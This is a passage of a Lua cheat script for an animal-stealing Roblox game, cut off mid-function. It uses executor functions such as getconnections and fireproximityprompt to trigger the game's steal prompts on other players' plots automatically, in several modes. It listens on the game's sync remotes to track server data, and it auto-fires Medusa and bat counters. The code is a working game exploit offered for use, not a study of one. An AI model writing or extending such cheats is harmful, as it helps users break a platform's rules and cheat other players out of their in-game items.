    if M.statusModeLbl then
        local modeText = tostring(M.stealMode or "Normal")
        if modeText == "V1" then modeText = "Normal" end
        M.statusModeLbl.Text = string.upper(modeText)
    end
end

function M.updateStatusRadius()
    if M.statusRadiusLbl then
        local r = 62
        pcall(function()
            r = (M.getActiveStealRadius and M.getActiveStealRadius()) or (M.Steal and M.Steal.StealRadius) or 62
        end)
        M.statusRadiusLbl.Text = string.format("Radius: %.2g", r)
    end
    if M.updateRadiusMarker then
        M.updateRadiusMarker()
    end
end





if not fireproximityprompt then
    fireproximityprompt = (getgenv and getgenv().fireproximityprompt)
        or (genv and genv().fireproximityprompt)
        or function(prompt)
            pcall(function()
                prompt:InputHoldBegin()
                task.wait(0.05)
                prompt:InputHoldEnd()
            end)
        end
end

local function isMyPlot(plotName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
    end
    return false
end

local function scanPlotNormal(plot)
    if not plot or not plot:IsA("Model") then return end
    if isMyPlot(plot.Name) then return end
    local podiums = plot:FindFirstChild("AnimalPodiums")
    if not podiums then return end
    for _, pod in ipairs(podiums:GetChildren()) do
        if pod:IsA("Model") and pod:FindFirstChild("Base") then
            local uid = plot.Name .. "_" .. pod.Name
            for _, ex in ipairs(M.animalCache) do if ex.uid == uid then return end end
            table.insert(M.animalCache, {
                name = pod.Name,
                plot = plot.Name,
                slot = pod.Name,
                worldPosition = pod:GetPivot().Position,
                uid = uid,
            })
        end
    end
end

local function findPromptNormal(ad)
    if not ad then return nil end
    local cp = M.promptCache[ad.uid]
    if cp and cp.Parent then return cp end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local plot = plots:FindFirstChild(ad.plot)
    if not plot then return nil end
    local pods = plot:FindFirstChild("AnimalPodiums")
    if not pods then return nil end
    local pod = pods:FindFirstChild(ad.slot)
    if not pod then return nil end
    local base = pod:FindFirstChild("Base")
    if not base then return nil end
    local spawn = base:FindFirstChild("Spawn")
    if not spawn then return nil end
    local att = spawn:FindFirstChild("PromptAttachment")
    local prompt = nil
    if att then
        for _, p in ipairs(att:GetChildren()) do
            if p:IsA("ProximityPrompt") then prompt = p; break end
        end
    end
    if not prompt then
        for _, obj in ipairs(spawn:GetDescendants()) do
            if obj:IsA("ProximityPrompt") then prompt = obj; break end
        end
    end
    if prompt then M.promptCache[ad.uid] = prompt end
    return prompt
end

local function nearestAnimalNormal()
    local char = player.Character
    if not char then return nil end
    local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")
    if not hrp then return nil end
    local best, bestD = nil, math.huge
    for _, ad in ipairs(M.animalCache) do
        if not isMyPlot(ad.plot) and ad.worldPosition then
            local d = (hrp.Position - ad.worldPosition).Magnitude
            if d < bestD then bestD = d; best = ad end
        end
    end
    return best, bestD
end

local function buildCallbacks(prompt)
    if M.stealCache[prompt] then return end
    local data = { holdCallbacks = {}, triggerCallbacks = {}, ready = true }
    local ok1, c1 = pcall(getconnections, prompt.PromptButtonHoldBegan)
    if ok1 and type(c1) == "table" then
        for _, conn in ipairs(c1) do
            if type(conn.Function) == "function" then
                table.insert(data.holdCallbacks, conn.Function)
            end
        end
    end
    local ok2, c2 = pcall(getconnections, prompt.Triggered)
    if ok2 and type(c2) == "table" then
        for _, conn in ipairs(c2) do
            if type(conn.Function) == "function" then
                table.insert(data.triggerCallbacks, conn.Function)
            end
        end
    end
    if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then
        M.stealCache[prompt] = data
    end
end

local function execStealNormal(prompt, animalName)
    local data = M.stealCache[prompt]
    if not data or not data.ready then return false end
    data.ready = false
    M.isStealing = true
    M.stealStartTime = tick()
    M.updateStealProgress(0.1)

    if M.progressConn then M.progressConn:Disconnect() end
    M.progressConn = RunService.Heartbeat:Connect(function()
        if not M.isStealing then
            M.progressConn:Disconnect()
            M.progressConn = nil
            return
        end
        local prog = math.clamp((tick() - M.stealStartTime) / M.Steal.StealDuration, 0, 1)
        M.updateStealProgress(prog)
    end)

    task.spawn(function()
        for _, fn in ipairs(data.holdCallbacks) do task.spawn(fn) end
        local elapsed = 0
        while elapsed < M.Steal.StealDuration do elapsed = elapsed + task.wait() end
        for _, fn in ipairs(data.triggerCallbacks) do task.spawn(fn) end
        task.wait(0.01)
        if M.progressConn then M.progressConn:Disconnect(); M.progressConn = nil end
        M.isStealing = false
        M.updateStealProgress(0)
        data.ready = true
    end)
    return true
end

function M.startNormalSteal()
    if M.stealConn then return end
    M.stealConn = RunService.Heartbeat:Connect(function()
        if not M.Steal.AutoStealEnabled or (M.stealMode ~= "Normal" and M.stealMode ~= "V1") or M.isStealing then return end
        local target, dist = nearestAnimalNormal()
        if not target then return end
        if dist > M.getActiveStealRadius() then return end
        local prompt = M.promptCache[target.uid]
        if not prompt or not prompt.Parent then
            prompt = findPromptNormal(target)
        end
        if prompt then
            buildCallbacks(prompt)
            execStealNormal(prompt, target.name)
        end
    end)
end

function M.stopNormalSteal()
    if M.stealConn then
        M.stealConn:Disconnect()
        M.stealConn = nil
    end
    M.isStealing = false
    if M.progressConn then M.progressConn:Disconnect(); M.progressConn = nil end
    M.updateStealProgress(0)
end

do
    local V2 = M.V2 or {}
    M.V2 = V2
    V2.enabled = false
    V2.isStealing = false
    V2.data = V2.data or {}
    V2.conn = nil
    V2.progressConn = nil
    V2.stealStartTime = 0
    V2.paused = false
    V2.pauseStarted = nil
    V2.pausedDuration = 0
    local function barSet(p, label)
        local progress = math.clamp(tonumber(p) or 0, 0, 1)
        local pct = math.floor(progress * 100 + 0.5)
        local text = nil
        if type(label) == "string" and label ~= "" then
            text = string.upper(label)
            if progress > 0 then text = text .. "  " .. tostring(pct) .. "%" end
        end
        M.updateStealProgress(progress, text)
    end
    local function barReset()
        M.updateStealProgress(0)
    end
    local function execStealV2(prompt)
        if V2.isStealing then return end
        if not prompt then return end
        buildCallbacks(prompt)
        local data = M.stealCache[prompt]
        if not data or not data.ready then return end
        data.ready = false
        V2.isStealing = true
        M.isStealing = true
        V2.stealStartTime = tick()
        V2.paused = false
        V2.pauseStarted = nil
        V2.pausedDuration = 0
        local duration = math.max(tonumber(M.Steal.StealDuration) or 1.4, 0.05)
        local pauseFraction = 0.75
        local finishFraction = 1 - pauseFraction
        local targetPart = prompt:FindFirstAncestorWhichIsA("BasePart")
        local restarting = false
        local function modeStillActive()
            return V2.enabled and M.stealMode == "V2" and V2.isStealing
        end
        local function isTargetInCurrentRadius()
            local char = player.Character
            local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
            local radius = M.getActiveStealRadius()
            return root and targetPart and targetPart.Parent and (root.Position - targetPart.Position).Magnitude <= radius
        end
        local function isCloseEnoughToGrab()
            local char = player.Character
            local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
            local closeRange = math.min(M.getActiveStealRadius(), 9)
            return root and targetPart and targetPart.Parent and (root.Position - targetPart.Position).Magnitude <= closeRange
        end
        local function canStillGrab()
            if not prompt or not prompt.Parent or not targetPart or not targetPart.Parent then return false end
            if not prompt.Enabled then return false end
            if not tostring(prompt.ActionText):lower():find("steal", 1, true) then return false end
            return isTargetInCurrentRadius()
        end
        local function restartFromZero()
            if restarting then return end
            restarting = true
            V2.paused = false
            V2.pauseStarted = nil
            V2.pausedDuration = 0
            if V2.progressConn then V2.progressConn:Disconnect(); V2.progressConn = nil end
            barReset()
            data.ready = true
            V2.isStealing = false
            M.isStealing = false
        end
        if V2.progressConn then V2.progressConn:Disconnect() end
        V2.progressConn = RunService.Heartbeat:Connect(function()
            if not V2.isStealing then
                if V2.progressConn then V2.progressConn:Disconnect(); V2.progressConn = nil end
                return
            end
            if not modeStillActive() or not canStillGrab() then
                restartFromZero()
                return
            end
            local elapsed = tick() - V2.stealStartTime - (V2.pausedDuration or 0)
            if V2.paused and V2.pauseStarted then
                elapsed = V2.pauseStarted - V2.stealStartTime - (V2.pausedDuration or 0)
            end
            barSet(math.clamp(elapsed / duration, 0, 1))
        end)
        task.spawn(function()
            for _, fn in ipairs(data.holdCallbacks) do task.spawn(fn) end
            if #data.holdCallbacks == 0 and #data.triggerCallbacks == 0 and fireproximityprompt then
                pcall(function()
                    fireproximityprompt(prompt, duration)
                end)
            end
            local holdStart = tick()
            while tick() - holdStart < duration * pauseFraction do
                if not modeStillActive() or not canStillGrab() then
                    restartFromZero()
                    return
                end
                task.wait()
            end
            V2.paused = true
            V2.pauseStarted = tick()
            local wasAbleToGrab = false
            local waitStart = tick()
            while modeStillActive() do
                if not canStillGrab() then
                    restartFromZero()
                    return
                end
                if isCloseEnoughToGrab() then
                    wasAbleToGrab = true
                    break
                end
                if tick() - waitStart >= 0.95 then
                    wasAbleToGrab = true
                    break
                end
                task.wait()
            end
            if not modeStillActive() or not canStillGrab() then
                restartFromZero()
                return
            end
            if wasAbleToGrab then
                V2.pausedDuration = (V2.pausedDuration or 0) + (tick() - V2.pauseStarted)
                V2.paused = false
                V2.pauseStarted = nil
                local finishStart = tick()
                while tick() - finishStart < duration * finishFraction do
                    if not modeStillActive() or not canStillGrab() then
                        restartFromZero()
                        return
                    end
                    task.wait()
                end
                for _, fn in ipairs(data.triggerCallbacks) do task.spawn(fn) end
                pcall(function() if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then _G.AutoCarrySpeed.WatchPickup(1.25) end end)
                if V2.progressConn then V2.progressConn:Disconnect(); V2.progressConn = nil end
                barSet(1, "SUCCESS")
                task.wait(0.05)
                barReset()
                data.ready = true
                V2.isStealing = false
                M.isStealing = false
            else
                restartFromZero()
            end
        end)
    end
    function M.startV2Steal()
        V2.enabled = true
        V2.isStealing = false
        if V2.conn then V2.conn:Disconnect(); V2.conn = nil end
        V2.conn = RunService.Heartbeat:Connect(function()
            if not V2.enabled then return end
            if not M.Steal.AutoStealEnabled then return end
            if M.stealMode ~= "V2" then M.stopV2Steal(); return end
            if V2.isStealing then return end
            local target, dist = nearestAnimalNormal()
            if not target then return end
            if dist > M.getActiveStealRadius() then return end
            local prompt = M.promptCache[target.uid]
            if not prompt or not prompt.Parent then
                prompt = findPromptNormal(target)
            end
            if prompt then
                execStealV2(prompt)
            end
        end)
    end
    function M.stopV2Steal()
        V2.enabled = false
        V2.isStealing = false
        V2.paused = false
        V2.pauseStarted = nil
        V2.pausedDuration = 0
        if V2.conn then V2.conn:Disconnect(); V2.conn = nil end
        if V2.progressConn then V2.progressConn:Disconnect(); V2.progressConn = nil end
        M.isStealing = false
        barReset()
    end
end




do
    local A = M.Semi
    if A.conn then pcall(function() A.conn:Disconnect() end); A.conn = nil end
    A.enabled = false
    A.holdMin = tonumber(A.holdMin) or 1.3
    A.holdMax = tonumber(A.holdMax) or 2.6
    A.entryDelay = tonumber(A.entryDelay) or 0.3
    A.cooldown = tonumber(A.cooldown) or 0.05
    A.primeRange = tonumber(A.primeRange) or 80
    A.radius = math.min(tonumber(A.radius) or 10, 10)
    A.plotSync = A.plotSync or {caches = {}, connections = {}}
    A.animals = A.animals or {}
    A.promptCache = A.promptCache or {}
    A.internalCache = A.internalCache or {}
    A.state = A.state or {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0}

    local function barSet(p, label)
        local progress = math.clamp(tonumber(p) or 0, 0, 1)
        local pct = math.floor(progress * 100 + 0.5)
        local text = nil
        if type(label) == "string" and label ~= "" then
            text = string.upper(label)
            if progress > 0 then
                text = text .. "  " .. tostring(pct) .. "%"
            end
        end
        M.updateStealProgress(progress, text)
    end
    local function barReset()
        M.updateStealProgress(0)
    end
    local function rootPart()
        local char = player.Character
        return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso")) or nil
    end
    local function splitPath(path)
        if typeof(path) == "table" then return path end
        local out = {}
        for part in string.gmatch(tostring(path), "[^%.]+") do
            table.insert(out, tonumber(part) or part)
        end
        return out
    end
    local function resolvePath(path, root)
        local current, parent, key = root, nil, nil
        for _, part in ipairs(splitPath(path)) do
            parent = current
            key = part
            current = current and current[part] or nil
        end
        return current, parent, key
    end
    local function applySyncDiff(channelName, packet)
        local cache = A.plotSync.caches[channelName]
        if typeof(cache) ~= "table" then return end
        local path, action, a, b = packet[1], packet[2], packet[3], packet[4]
        local current, parent, key = resolvePath(path, cache)
        if action == "Changed" then
            if parent ~= nil then parent[key] = a end
        elseif action == "ArrayInsert" then
            if current ~= nil then table.insert(current, b, a) end
        elseif action == "ArrayRemoved" then
            if current ~= nil then table.remove(current, b) end
        elseif action == "DictionaryInsert" then
            if current ~= nil then current[b] = a end
        elseif action == "DictionaryRemoved" then
            if current ~= nil then current[b] = nil end
        end
    end
    local function attachPlotChannel(remote, plots, requestData)
        if A.plotSync.connections[remote] then return end
        local channelName = tostring(remote.Name)
        if not plots:FindFirstChild(channelName) then return end
        if requestData and A.plotSync.caches[channelName] == nil then
            local ok, data = pcall(function() return requestData:InvokeServer(channelName) end)
            A.plotSync.caches[channelName] = (ok and typeof(data) == "table") and data or {}
        elseif A.plotSync.caches[channelName] == nil then
            A.plotSync.caches[channelName] = {}
        end
        A.plotSync.connections[remote] = remote.OnClientEvent:Connect(function(queue)
            for _, packet in ipairs(queue) do applySyncDiff(channelName, packet) end
        end)
    end

    function M.initSemiSync()
        if A.syncReady then return true end
        local ok = pcall(function()
            local rs = game:GetService("ReplicatedStorage")
            A.packages = rs:WaitForChild("Packages", 10)
            A.datas = rs:WaitForChild("Datas", 10)
            A.plots = workspace:WaitForChild("Plots", 10)
            if not (A.packages and A.datas and A.plots) then return end
            A.animalsData = require(A.datas:WaitForChild("Animals", 10))
            local sync = A.packages:WaitForChild("Synchronizer", 10)
            A.channelFolder = sync:WaitForChild("Channel", 10)
            A.routeRemote = sync:WaitForChild("CommunicationRoute", 10)
            A.requestData = sync:FindFirstChild("RequestData")
            for _, child in ipairs(A.channelFolder:GetChildren()) do
                if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
            end
            A.channelFolder.ChildAdded:Connect(function(child)
                if child:IsA("RemoteEvent") then attachPlotChannel(child, A.plots, A.requestData) end
            end)
            A.routeRemote.OnClientEvent:Connect(function(actions)
                for _, action in ipairs(actions) do
                    local kind, channelName = action[1], tostring(action[2])
                    if A.plots and A.plots:FindFirstChild(channelName) then
                        if kind == "ListenerAdded" then
                            local remote = A.channelFolder and A.channelFolder:FindFirstChild(channelName)
                            if remote and remote:IsA("RemoteEvent") then attachPlotChannel(remote, A.plots, A.requestData) end
                        elseif kind == "ListenerRemoved" then
                            for remote, conn in pairs(A.plotSync.connections) do
                                if tostring(remote.Name) == channelName then
                                    pcall(function() conn:Disconnect() end)
                                    A.plotSync.connections[remote] = nil
                                    A.plotSync.caches[channelName] = nil
                                    break
                                end
                            end
                        end
                    end
                end
            end)
            A.syncReady = true
        end)
        return ok and A.syncReady == true
    end

    local function getPlotOwner(plot)
        local sign = plot and plot:FindFirstChild("PlotSign")
        local frame = sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
        local label = frame and frame:FindFirstChild("TextLabel")
        if not label or label.Text == "Empty Base" then return nil end
        return label.Text:gsub("'s [Bb]ase$", ""):gsub("%s+$", "")
    end
    local function isMyBaseAnimal(animalData)
        if not animalData or not animalData.plot or not A.plots then return false end
        local plot = A.plots:FindFirstChild(animalData.plot)
        if not plot then return false end
        local owner = getPlotOwner(plot)
        return owner == player.DisplayName or owner == player.Name
    end
    local function podiumFor(animalData)
        local plot = A.plots and A.plots:FindFirstChild(animalData.plot)
        local podiums = plot and plot:FindFirstChild("AnimalPodiums")
        return podiums and podiums:FindFirstChild(animalData.slot) or nil
    end
    local function animalPos(animalData)
        local podium = podiumFor(animalData)
        return podium and podium:GetPivot().Position or nil
    end
    local function distToAnimal(animalData)
        local root = rootPart()
        local pos = animalPos(animalData)
        return root and pos and (root.Position - pos).Magnitude or math.huge
    end
    local function findPromptForAnimal(animalData)
        if not animalData then return nil end
        local cached = A.promptCache[animalData.uid]
        if cached and cached.Parent then return cached end
        local podium = podiumFor(animalData)
        local base = podium and podium:FindFirstChild("Base")
        local spawn = base and base:FindFirstChild("Spawn")
        local attach = spawn and spawn:FindFirstChild("PromptAttachment")
        if not attach then return nil end
        for _, prompt in ipairs(attach:GetChildren()) do
            if prompt:IsA("ProximityPrompt") then
                A.promptCache[animalData.uid] = prompt
                return prompt
            end
        end
        return nil
    end

    function M.scanAllPlotsSemi()
        if not M.initSemiSync() then return 0 end
        local newCache = {}
        for _, plot in ipairs(A.plots:GetChildren()) do
            local cache = A.plotSync.caches[plot.Name]
            local animalList = cache and cache.AnimalList
            if typeof(animalList) == "table" then
                for slot, animalData in pairs(animalList) do
                    if type(animalData) == "table" then
                        local animalName = animalData.Index
                        local info = A.animalsData and A.animalsData[animalName]
                        if info then
                            table.insert(newCache, {
                                name = info.DisplayName or animalName,
                                plot = plot.Name,
                                slot = tostring(slot),
                                uid = plot.Name .. "_" .. tostring(slot),
                            })
                        end
                    end
                end
            end
        end
        A.animals = newCache
        return #newCache
    end

    local function pickClosest()
        local root = rootPart()
        if not root then return nil end
        local best, bestDist = nil, math.huge
        for _, animalData in ipairs(A.animals) do
            if not isMyBaseAnimal(animalData) then
                local pos = animalPos(animalData)
                local dist = pos and (root.Position - pos).Magnitude or math.huge
                if dist <= (A.primeRange or 80) and dist < bestDist then
                    best, bestDist = animalData, dist
                end
            end
        end
        return best
    end
    local function buildCallbacks(prompt)
        if A.internalCache[prompt] then return end
        local data = {holdCallbacks = {}, triggerCallbacks = {}, ready = true}
        local okHold, holds = pcall(getconnections, prompt.PromptButtonHoldBegan)
        if okHold and type(holds) == "table" then
            for _, conn in ipairs(holds) do
                if type(conn.Function) == "function" then table.insert(data.holdCallbacks, conn.Function) end
            end
        end
        local okTrigger, triggers = pcall(getconnections, prompt.Triggered)
        if okTrigger and type(triggers) == "table" then
            for _, conn in ipairs(triggers) do
                if type(conn.Function) == "function" then table.insert(data.triggerCallbacks, conn.Function) end
            end
        end
        if #data.holdCallbacks > 0 or #data.triggerCallbacks > 0 then A.internalCache[prompt] = data end
    end
    local function executeSemi(prompt, animalData)
        if not prompt or not prompt.Parent or not animalData then return false end
        buildCallbacks(prompt)
        local data = A.internalCache[prompt]
        if not data or not data.ready then return false end
        data.ready = false
        A.state.active = true
        A.state.startTime = tick()
        A.state.phase = "holding"
        A.state.label = animalData.name or "Animal"
        M.isStealing = true
        M.stealStartTime = A.state.startTime
        task.spawn(function()
            local startTime = A.state.startTime
            for _, fn in ipairs(data.holdCallbacks) do task.spawn(function() pcall(fn) end) end
            while A.enabled and (M.stealMode == "Semi" or M.stealMode == "V2") and tick() - startTime < (A.holdMin or 1.3) do
                local elapsed = tick() - startTime
                A.state.phase = "holding"
                barSet(elapsed / (A.holdMax or 2.6), "HOLDING " .. tostring(A.state.label))
                task.wait()
            end
            A.state.phase = "waitingRange"
            local alreadyInRange = distToAnimal(animalData) <= (tonumber(A.radius) or 10)
            local fired = false
            while A.enabled and (M.stealMode == "Semi" or M.stealMode == "V2") and prompt.Parent do
                local elapsed = tick() - startTime
                if elapsed > (A.holdMax or 2.6) then break end
                barSet(elapsed / (A.holdMax or 2.6), "MOVE CLOSER  " .. tostring(A.state.label))
                if distToAnimal(animalData) <= (tonumber(A.radius) or 10) then
                    if not alreadyInRange then task.wait(A.entryDelay or 0.3) end
                    if A.enabled and (M.stealMode == "Semi" or M.stealMode == "V2") then
                        for _, fn in ipairs(data.triggerCallbacks) do task.spawn(function() pcall(fn) end) end
                        pcall(function() if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then _G.AutoCarrySpeed.WatchPickup(1.25) end end)
                        fired = true
                    end
                    break
                end
                task.wait()
            end
            A.state.lastResult = fired and ("Stole " .. tostring(A.state.label)) or ("Missed window: " .. tostring(A.state.label))
            A.state.active = false
            A.state.phase = "idle"
            A.state.lastResultTime = tick()
            if fired then
                barSet(1, "STOLE " .. tostring(A.state.label))
            else
                barSet(0, A.state.lastResult)
            end
            task.wait(A.cooldown or 0.05)
            data.ready = true
            M.isStealing = false
            barReset()
        end)
        return true
    end

    function M.stopSemiSteal()
        A.enabled = false
        if A.conn then A.conn:Disconnect(); A.conn = nil end
        A.state.active = false
        A.state.phase = "idle"
        M.isStealing = false
        barReset()
    end

    function M.startSemiSteal()
        A.radius = math.min(tonumber(A.radius) or 10, 10)
        A.enabled = true
        M.initSemiSync()
        pcall(M.scanAllPlotsSemi)
        if A.conn then A.conn:Disconnect(); A.conn = nil end
        A.conn = RunService.Heartbeat:Connect(function()
            if not A.enabled then return end
            if not M.Steal.AutoStealEnabled then return end
            if M.stealMode ~= "Semi" and M.stealMode ~= "V2" then M.stopSemiSteal(); return end
            if A.state.active then return end
            local target = pickClosest()
            if not target then return end
            local prompt = findPromptForAnimal(target)
            if prompt then executeSemi(prompt, target) end
        end)
    end
end

local function v3ReleasePrompt(prompt)
    if not prompt then return end
    pcall(function()
        if prompt.InputHoldEnd then prompt:InputHoldEnd() end
    end)
end

local function v3HoldPrompt(prompt)
    if not prompt or not prompt.Parent then return false end
    
    local ok = pcall(function()
        if prompt.InputHoldBegin then
            prompt:InputHoldBegin()
        end
    end)
    if not ok then
        pcall(function()
            if fireproximityprompt then
                fireproximityprompt(prompt)
            end
        end)
    end
    
    buildCallbacks(prompt)
    local data = M.stealCache[prompt]
    if data then
        for _, fn in ipairs(data.holdCallbacks) do
            task.spawn(function() pcall(fn) end)
        end
    end
    return true
end

local function v3TriggerPrompt(prompt)
    if not prompt then return end
    buildCallbacks(prompt)
    local data = M.stealCache[prompt]
    if data then
        for _, fn in ipairs(data.triggerCallbacks) do
            task.spawn(function() pcall(fn) end)
        end
    end
    pcall(function()
        if prompt.InputHoldEnd then prompt:InputHoldEnd() end
    end)
    pcall(function()
        if fireproximityprompt then
            fireproximityprompt(prompt)
        end
    end)
end

local function v3LiveDist(ad, hrp)
    if not ad or not hrp then return math.huge end
    
    local plots = workspace:FindFirstChild("Plots")
    local plot = plots and plots:FindFirstChild(ad.plot)
    local pods = plot and plot:FindFirstChild("AnimalPodiums")
    local pod = pods and pods:FindFirstChild(ad.slot)
    if pod then
        local ok, pos = pcall(function() return pod:GetPivot().Position end)
        if ok and pos then
            ad.worldPosition = pos
            return (hrp.Position - pos).Magnitude
        end
    end
    if ad.worldPosition then
        return (hrp.Position - ad.worldPosition).Magnitude
    end
    return math.huge
end

function M.startV3Steal()
    if M.V3.conn then return end
    M.V3.enabled = true
    M.V3.progress = 0
    M.V3.currentUid = nil
    M.V3.lastInRange = 0
    M.V3.holding = false
    M.V3.holdPrompt = nil
    M.V3.cooldownUntil = 0
    M.V3.lastHoldPulse = 0

    M.V3.conn = RunService.Heartbeat:Connect(function(dt)
        if not M.Steal.AutoStealEnabled or M.stealMode ~= "V3" or not M.V3.enabled then
            if M.V3.holdPrompt then v3ReleasePrompt(M.V3.holdPrompt) end
            if M.V3.progress > 0 or M.V3.holding or M.isStealing then
                M.V3.progress = 0
                M.V3.currentUid = nil
                M.V3.holding = false
                M.V3.holdPrompt = nil
                M.isStealing = false
                M.updateStealProgress(0)
            end
            return
        end

        local stopT = math.max(tonumber(M.Steal.StopTime) or 0.35, 0.05)
        local holdT = math.max(tonumber(M.Steal.StealDuration) or 1.4, 0.05)

        if tick() < (M.V3.cooldownUntil or 0) then
            M.updateStealProgress(0)
            return
        end

        local char = player.Character
        local hrp = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
        if not hrp then return end

        local target = nearestAnimalNormal()
        local dist = target and v3LiveDist(target, hrp) or math.huge
        local radius = M.getActiveStealRadius()
        local inRange = target ~= nil and dist <= radius

        if inRange then
            M.V3.lastInRange = tick()

            if M.V3.currentUid ~= target.uid then
                
                if M.V3.holdPrompt then v3ReleasePrompt(M.V3.holdPrompt) end
                M.V3.currentUid = target.uid
                M.V3.progress = 0
                M.V3.holding = false
                M.V3.holdPrompt = nil
            end

            local prompt = M.promptCache[target.uid]
            if not prompt or not prompt.Parent then
                prompt = findPromptNormal(target)
            end
            if not prompt then
                
                M.V3.progress = math.clamp(M.V3.progress + (dt / holdT), 0, 1)
                M.updateStealProgress(M.V3.progress)
                M.isStealing = M.V3.progress > 0
                return
            end

            
            M.V3.holdPrompt = prompt
            M.isStealing = true
            local now = tick()
            if (not M.V3.holding) or (now - (M.V3.lastHoldPulse or 0) > 0.1) then
                M.V3.holding = true
                M.V3.lastHoldPulse = now
                v3HoldPrompt(prompt)
            end

            M.V3.progress = math.clamp(M.V3.progress + (dt / holdT), 0, 1)
            M.updateStealProgress(M.V3.progress)

            if M.V3.progress >= 1 then
                v3TriggerPrompt(prompt)
                M.V3.progress = 0
                M.V3.currentUid = nil
                M.V3.holding = false
                M.V3.holdPrompt = nil
                M.isStealing = false
                M.updateStealProgress(0)
                M.V3.cooldownUntil = tick() + math.max(stopT, 0.25)
            end
        else
            
            if M.V3.holding or M.V3.holdPrompt then
                v3ReleasePrompt(M.V3.holdPrompt)
                M.V3.holding = false
                M.V3.holdPrompt = nil
            end

            if M.V3.progress > 0 then
                local decay = dt / stopT
                M.V3.progress = math.max(0, M.V3.progress - decay)
                M.updateStealProgress(M.V3.progress)
                if M.V3.progress <= 0 then
                    M.V3.currentUid = nil
                    M.isStealing = false
                    M.updateStealProgress(0)
                else
                    M.isStealing = true
                end
            else
                M.isStealing = false
            end
        end
    end)
end

function M.stopV3Steal()
    M.V3.enabled = false
    if M.V3.holdPrompt then
        v3ReleasePrompt(M.V3.holdPrompt)
    end
    if M.V3.conn then
        pcall(function() M.V3.conn:Disconnect() end)
        M.V3.conn = nil
    end
    M.V3.progress = 0
    M.V3.currentUid = nil
    M.V3.holding = false
    M.V3.holdPrompt = nil
    M.V3.cooldownUntil = 0
    M.V3.lastInRange = 0
    M.V3.lastHoldPulse = 0
    M.isStealing = false
    M.updateStealProgress(0)
end



function M.startAutoSteal()
    if M.statusGui then M.statusGui.Enabled = true end
    local mode = M.stealMode
    if mode == "Semi" then
        M.startSemiSteal()
    elseif mode == "V2" then
        M.startV2Steal()
    elseif mode == "V3" then
        M.startV3Steal()
    else
        M.startNormalSteal()
    end
end

function M.stopAutoSteal()
    if M.statusGui then M.statusGui.Enabled = true end
    M.stopNormalSteal()
    M.stopSemiSteal()
    M.stopV2Steal()
    M.stopV3Steal()
    M.isStealing = false
    M.updateStealProgress(0)
end

function M.setStealRadius(radius)
    M.Steal.StealRadius = radius
    M.updateStatusRadius()
end




function M.findBat()
    local char=player.Character;if not char then return nil end
    for _,tool in ipairs(char:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end
    local bp=player:FindFirstChild("Backpack");if bp then for _,tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end end
    return nil
end

function M.findMedusa()
    local c=player.Character;if not c then return nil end
    for _,t in ipairs(c:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end
    local bp=player:FindFirstChild("Backpack");if bp then for _,t in ipairs(bp:GetChildren()) do if t:IsA("Tool") then local n=t.Name:lower();if n:find("medusa") or n:find("head") or n:find("stone") then return t end end end end
    return nil
end

function M.useMedusaCounter()
    if M.medusaDebounce then return end;if M.MEDUSA_COOLDOWN>(tick()-M.medusaLastUsed) then return end
    local c=player.Character;if not c then return end;M.medusaDebounce=true
    local med=M.findMedusa();if not med then M.medusaDebounce=false;return end
    if med.Parent~=c then local hum2=c:FindFirstChildOfClass("Humanoid");if hum2 then hum2:EquipTool(med) end end
    pcall(function() med:Activate() end);M.medusaLastUsed=tick();M.medusaDebounce=false
end

function M.onAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if part.Anchored and part.Transparency==1 then
            if M.medusaCounterEnabled then
                M.useMedusaCounter()
            end
        end
    end)
end

function M.setupMedusa(char)
    for _,c in pairs(M.Conns.anchor) do pcall(function() c:Disconnect() end) end;M.Conns.anchor={}
    if not char then return end
    for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then table.insert(M.Conns.anchor,M.onAnchorChanged(part)) end end
    table.insert(M.Conns.anchor,char.DescendantAdded:Connect(function(part) if part:IsA("BasePart") then table.insert(M.Conns.anchor,M.onAnchorChanged(part)) end end))
end

function M.stopMedusaCounter() for _,c in pairs(M.Conns.anchor) do pcall(function() c:Disconnect() end) end;M.Conns.anchor={} end

function M.findBatForCounter()
    local c=player.Character;if not c then return nil end;local bp=player:FindFirstChildOfClass("Backpack")
    for _,name in ipairs(M.BAT_COUNTER_SLAP_LIST) do local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name));if t then return t end end
    for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
    if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end
    return nil
end

function M.swingBatForCounter(bat,char)
    local hum2=char:FindFirstChildOfClass("Humanoid")
    if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end;task.wait(0.05) end
    local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
    if remote and remote:IsA("RemoteEvent") then pcall(function() remote:FireServer() end);task.wait(0.15);pcall(function() remote:FireServer() end)
